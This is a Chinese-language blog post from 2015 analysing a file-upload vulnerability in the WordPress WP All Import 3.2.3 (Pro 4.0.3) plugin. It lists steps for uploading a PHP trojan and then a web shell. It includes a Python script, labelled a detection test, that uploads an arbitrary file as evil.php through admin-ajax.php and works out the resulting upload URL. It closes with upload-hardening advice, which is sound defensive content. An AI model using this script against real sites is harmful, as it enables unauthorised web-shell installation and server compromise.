title: Wordpress WP All Import插件漏洞分析
date: 2015-10-31 21:19:52
tags: [安全心得,入侵分析,安全事件]
---
<!--more-->
# 0x00 插件

Wordpress WP All Import 3.2.3 (Pro 4.0.3)插件主要功能是支持用户上传XML和CSV文件。一般这种支持上传功能的插件最最最危险的地方就是不做文件格式检测，或者是检测方法过弱易被绕过。
该插件上传的文件可以通过

http://"+site+"/wp-content/uploads/wpallimport/uploads/"+up_dir+"/ 路径访问。



# 0x01 利用

非常简单的利用方法：

1. 一个PHP木马（小马）
2. 找到上传插件的位置
3. 上传恶意文件
4. 访问小马，上传Shell

详细漏洞介绍：

因为该插件版本已经更新了，有问题的版本已经没法下载了。只能看别人的具体分析了。

[WordPress WP All 3.2.3 Shell Upload](http://www.pritect.net/blog/wp-all-import-3-2-3-pro-4-0-3-vulnerability-breakdown)

# 0X02 检测

写个简单的脚本就可以测试漏洞了

```
import requests,os
site=""
file_to_upload =''
up_req = requests.post('http://'+site+'/wp-admin/admin-ajax.php?page=pmxi-admin-settings&action=upload&name=evil.php',data=open(file_to_upload,'rb').read())
up_dir = os.popen('php -r "print md5(strtotime(\''+up_req.headers['date']+'\'));"').read()
print "http://"+site+"/wp-content/uploads/wpallimport/uploads/"+up_dir+"/%s" % （file_to_upload）
```

site处填域名，file_to_upload处填上传的文件名。

# 0x03 反思

很多网站都具备上传功能，支持的格式也多种多样。针对上传漏洞，解决方法个人觉得可以有以下方法：

1. 把文件上传到root目录以外的目录里（严格控制目录权限，文件权限。
2. 禁止覆盖已存在的文件
3. 严格验证文件格式
4. 随机生成上传文件名
5. 必要情况下增加上传白名单（功能只开放给某些用户）。

